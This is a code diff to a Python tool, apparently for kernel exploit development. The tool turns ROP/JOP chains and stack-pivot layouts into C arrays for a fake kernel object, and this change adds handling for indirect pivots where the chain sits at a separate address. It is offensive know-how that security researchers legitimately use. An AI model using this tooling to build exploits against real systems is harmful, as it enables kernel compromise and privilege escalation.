@@ -238,6 +238,31 @@ def pivot_to_c_comment(pivot, kern_base):
     return "\n".join(lines)
 
 
+def ropchain_to_c_array(rop_chain, symbol_map, var_name, kern_base):
+    """Render a RopChain as a standalone C uint64_t array.
+
+    Used for indirect pivots where the chain lives at a separate known
+    address rather than inline in the exploit object.
+    """
+    all_items = []
+    for c in rop_chain.chains:
+        all_items.extend(c.get_chains())
+    if rop_chain.next_call:
+        all_items.extend(rop_chain.next_call.get_chains())
+
+    lines = []
+    lines.append("uint64_t {}[] = {{".format(var_name))
+    for i, item in enumerate(all_items):
+        val = item.getValue(rop_chain.base_addr)
+        comment = item.comment
+        if not comment and val in symbol_map:
+            comment = symbol_map[val]
+        suffix = " // {}".format(comment) if comment else ""
+        lines.append("    {},{}".format(_fmt_val_padded(val, kern_base), suffix))
+    lines.append("};")
+    return "\n".join(lines)
+
+
 def payload_to_c_struct(payload_dict, rop_chain, pivot, symbol_map,
                         var_name, kern_base, used_dispatch=None,
                         shift_info=None):
@@ -245,7 +270,12 @@ def payload_to_c_struct(payload_dict, rop_chain, pivot, symbol_map,
 
     Embeds per-gadget comments from the RopChain into the object layout.
     Annotates reserved offsets and shift gadgets when present.
+
+    For indirect pivots, the chain is NOT embedded — only dispatch entries
+    and the pointer slot are included.  The chain goes in a separate array.
     """
+    is_indirect = pivot.pivot_type in ('indirect', 'jop_indirect')
+
     obj = payload_dict['obj_layout']
     chain_offset = payload_dict['chain_offset']
     func_ptr = payload_dict['func_ptr']
@@ -255,25 +285,30 @@ def payload_to_c_struct(payload_dict, rop_chain, pivot, symbol_map,
     defines = []
     defines.append("#define PIVOT_GADGET {}".format(_fmt_val(func_ptr, kern_base)))
     defines.append("#define OBJ_SIZE     0x{:x}".format(len(obj)))
-    defines.append("#define CHAIN_OFFSET 0x{:x}".format(chain_offset))
-    if ptr_offset is not None:
+    if is_indirect:
+        defines.append("#define CHAIN_ADDR   0xDEADBEEFULL  // TODO: set to rop_chain address")
         defines.append("#define PTR_OFFSET   0x{:x}".format(ptr_offset))
+    else:
+        defines.append("#define CHAIN_OFFSET 0x{:x}".format(chain_offset))
+        if ptr_offset is not None:
+            defines.append("#define PTR_OFFSET   0x{:x}".format(ptr_offset))
     for i, (off, addr) in enumerate(dispatch):
         defines.append("#define DISPATCH_{}_OFFSET 0x{:x}".format(i, off))
 
     # Build annotation map: offset -> description
     annotations = {}
-    annotations[chain_offset] = "ROP chain start"
-    if ptr_offset is not None:
-        annotations[ptr_offset] = "pointer to chain"
+    if is_indirect:
+        annotations[ptr_offset] = "pointer to chain -> CHAIN_ADDR"
+    else:
+        annotations[chain_offset] = "ROP chain start"
+        if ptr_offset is not None:
+            annotations[ptr_offset] = "pointer to chain"
     for i, (off, addr) in enumerate(dispatch):
         annotations[off] = "dispatch[{}] -> {}".format(i, _fmt_val(addr, kern_base))
 
     # Annotate reserved offsets
-    reserved_offsets = set()
     if used_dispatch:
         for off in used_dispatch:
-            reserved_offsets.add(off)
             if off not in annotations:
                 annotations[off] = "RESERVED"
 
@@ -283,61 +318,73 @@ def payload_to_c_struct(payload_dict, rop_chain, pivot, symbol_map,
         for s_off, s_gad, s_bytes in shift_info:
             shift_offsets[s_off] = (s_gad, s_bytes)
 
-    # Build chain item comment map from the RopChain.
-    # When shift gadgets were inserted, the mapping between chain items
-    # and object offsets is non-trivial — walk the same way build_patched_payload does.
+    # Build chain item comment map from the RopChain (only for inline chains).
     chain_comments = {}
-    all_items = []
-    for c in rop_chain.chains:
-        all_items.extend(c.get_chains())
-    if rop_chain.next_call:
-        all_items.extend(rop_chain.next_call.get_chains())
-
-    if shift_info:
-        # Replay the segment-based layout to map items to offsets.
-        # Walk segments the same way build_patched_payload does.
-        segments = []
+    if not is_indirect:
+        all_items = []
         for c in rop_chain.chains:
-            segments.append(c.get_chains())
+            all_items.extend(c.get_chains())
         if rop_chain.next_call:
-            segments.append(rop_chain.next_call.get_chains())
-        cur_off = chain_offset
-        for seg_items in segments:
-            # Check if a shift gadget was inserted before this segment
-            if cur_off in shift_offsets:
-                s_gad, s_bytes = shift_offsets[cur_off]
-                chain_comments[cur_off] = "shift: {} (skip 0x{:x})".format(
-                    str(s_gad), s_bytes)
-                cur_off += 8 + s_bytes
-            for item in seg_items:
+            all_items.extend(rop_chain.next_call.get_chains())
+
+        if shift_info:
+            segments = []
+            for c in rop_chain.chains:
+                segments.append(c.get_chains())
+            if rop_chain.next_call:
+                segments.append(rop_chain.next_call.get_chains())
+            cur_off = chain_offset
+            for seg_items in segments:
+                if cur_off in shift_offsets:
+                    s_gad, s_bytes = shift_offsets[cur_off]
+                    chain_comments[cur_off] = "shift: {} (skip 0x{:x})".format(
+                        str(s_gad), s_bytes)
+                    cur_off += 8 + s_bytes
+                for item in seg_items:
+                    comment = item.comment
+                    val = item.getValue(rop_chain.base_addr)
+                    if not comment and val in symbol_map:
+                        comment = symbol_map[val]
+                    if comment:
+                        chain_comments[cur_off] = comment
+                    cur_off += 8
+        else:
+            for i, item in enumerate(all_items):
+                item_off = chain_offset + i * 8
                 comment = item.comment
                 val = item.getValue(rop_chain.base_addr)
                 if not comment and val in symbol_map:
                     comment = symbol_map[val]
                 if comment:
-                    chain_comments[cur_off] = comment
-                cur_off += 8
-    else:
-        for i, item in enumerate(all_items):
-            item_off = chain_offset + i * 8
-            comment = item.comment
-            val = item.getValue(rop_chain.base_addr)
-            if not comment and val in symbol_map:
-                comment = symbol_map[val]
-            if comment:
-                chain_comments[item_off] = comment
+                    chain_comments[item_off] = comment
 
-    # Find last non-zero qword
+    # Find last non-zero qword (for indirect, stop at dispatch/pointer area)
     last_nonzero = 0
-    for off in range(0, len(obj), 8):
-        qword = struct.unpack_from('<Q', obj, off)[0]
-        if qword:
-            last_nonzero = off
+    if is_indirect:
+        # Only emit up to the last dispatch/pointer/reserved slot
+        slots = set()
+        for off, _ in dispatch:
+            slots.add(off)
+        if ptr_offset is not None:
+            slots.add(ptr_offset)
+        if used_dispatch:
+            slots.update(used_dispatch)
+        last_nonzero = max(slots) if slots else 0
+    else:
+        for off in range(0, len(obj), 8):
+            qword = struct.unpack_from('<Q', obj, off)[0]
+            if qword:
+                last_nonzero = off
 
     lines = defines + [""]
     lines.append("uint64_t {}[] = {{".format(var_name))
     for off in range(0, last_nonzero + 8, 8):
         qword = struct.unpack_from('<Q', obj, off)[0]
+        # For indirect pivots, show CHAIN_ADDR at the pointer slot
+        if is_indirect and off == ptr_offset:
+            val_str = "{:<{w}}".format("CHAIN_ADDR", w=_VAL_WIDTH)
+        else:
+            val_str = _fmt_val_padded(qword, kern_base)
         parts = []
         parts.append("+0x{:02x}".format(off))
         if off in annotations:
@@ -347,7 +394,7 @@ def payload_to_c_struct(payload_dict, rop_chain, pivot, symbol_map,
         elif off not in annotations and qword in symbol_map:
             parts.append(symbol_map[qword])
         comment = " | ".join(parts)
-        lines.append("    {}, // {}".format(_fmt_val_padded(qword, kern_base), comment))
+        lines.append("    {}, // {}".format(val_str, comment))
     lines.append("};")
     return "\n".join(lines)
 
@@ -737,13 +784,8 @@ def main():
     print("\nSelected pivot:")
     pivot.dump()
 
-    # Build payload — detect reserved offset conflicts and insert shift gadgets
-    chain_bytes = chain.payload_str()
-    chain_off = (pivot.chain_offset_computed
-                 if pivot.pivot_type in ('jop', 'jop_indirect', 'jop_push')
-                 else pivot.offset)
-    chain_end = chain_off + len(chain_bytes)
-    obj_size = max(0x100, chain_end + 0x40)
+    # Detect whether this is an indirect pivot (chain at separate address)
+    is_indirect = pivot.pivot_type in ('indirect', 'jop_indirect')
 
     # Collect all occupied offsets: user-reserved + JOP dispatch entries
     all_occupied = dict(used_dispatch)
@@ -751,32 +793,50 @@ def main():
         for off, addr in pivot.dispatch_entries:
             all_occupied[off] = addr
 
-    # Check if any occupied offsets conflict with the chain region
-    conflicts = sorted(off for off in all_occupied
-                        if chain_off <= off < chain_end)
-
-    if conflicts:
-        print("\nOccupied offsets within chain region: {}".format(
-            ", ".join("0x{:x}".format(o) for o in conflicts)))
-        for off in conflicts:
-            if off in used_dispatch:
-                print("  0x{:x}: reserved by user".format(off))
-            else:
-                print("  0x{:x}: JOP dispatch -> 0x{:x}".format(
-                    off, all_occupied[off]))
-        print("Inserting shift gadgets to skip occupied slots...")
-        payload, shift_info = build_patched_payload(
-            e, chain, pivot, all_occupied, obj_size)
-        for s_off, s_gad, s_bytes in shift_info:
-            print("  0x{:x}: {} (skip 0x{:x} bytes)".format(
-                s_off, s_gad, s_bytes))
-    else:
+    if is_indirect:
+        # Indirect: chain goes at a separate known address, not inline.
+        # Object only holds dispatch entries + pointer slot.
+        obj_size = 0x100
         payload = pivot.build_payload(chain, obj_size=obj_size)
         shift_info = []
 
-    print("\n{}".format(payload['description']))
-    print("Chain offset: 0x{:x}".format(payload['chain_offset']))
-    print("Object size:  0x{:x} bytes".format(len(payload['obj_layout'])))
+        print("\n{}".format(payload['description']))
+        print("Pointer offset: 0x{:x}".format(payload['ptr_offset']))
+        print("Object size:    0x{:x} bytes".format(len(payload['obj_layout'])))
+    else:
+        # Inline: build payload with shift gadgets if needed
+        chain_bytes = chain.payload_str()
+        chain_off = (pivot.chain_offset_computed
+                     if pivot.pivot_type in ('jop', 'jop_push')
+                     else pivot.offset)
+        chain_end = chain_off + len(chain_bytes)
+        obj_size = max(0x100, chain_end + 0x40)
+
+        conflicts = sorted(off for off in all_occupied
+                            if chain_off <= off < chain_end)
+
+        if conflicts:
+            print("\nOccupied offsets within chain region: {}".format(
+                ", ".join("0x{:x}".format(o) for o in conflicts)))
+            for off in conflicts:
+                if off in used_dispatch:
+                    print("  0x{:x}: reserved by user".format(off))
+                else:
+                    print("  0x{:x}: JOP dispatch -> 0x{:x}".format(
+                        off, all_occupied[off]))
+            print("Inserting shift gadgets to skip occupied slots...")
+            payload, shift_info = build_patched_payload(
+                e, chain, pivot, all_occupied, obj_size)
+            for s_off, s_gad, s_bytes in shift_info:
+                print("  0x{:x}: {} (skip 0x{:x} bytes)".format(
+                    s_off, s_gad, s_bytes))
+        else:
+            payload = pivot.build_payload(chain, obj_size=obj_size)
+            shift_info = []
+
+        print("\n{}".format(payload['description']))
+        print("Chain offset: 0x{:x}".format(payload['chain_offset']))
+        print("Object size:  0x{:x} bytes".format(len(payload['obj_layout'])))
 
     # Generate C output
     c_lines = []
@@ -795,6 +855,10 @@ def main():
                                        "exploit_obj", kern_base,
                                        used_dispatch=all_occupied,
                                        shift_info=shift_info))
+    if is_indirect:
+        c_lines.append("")
+        c_lines.append(ropchain_to_c_array(chain, symbol_map, "rop_chain",
+                                           kern_base))
     c_output = "\n".join(c_lines) + "\n"
 
     print("\n=== Generated C code ===\n")
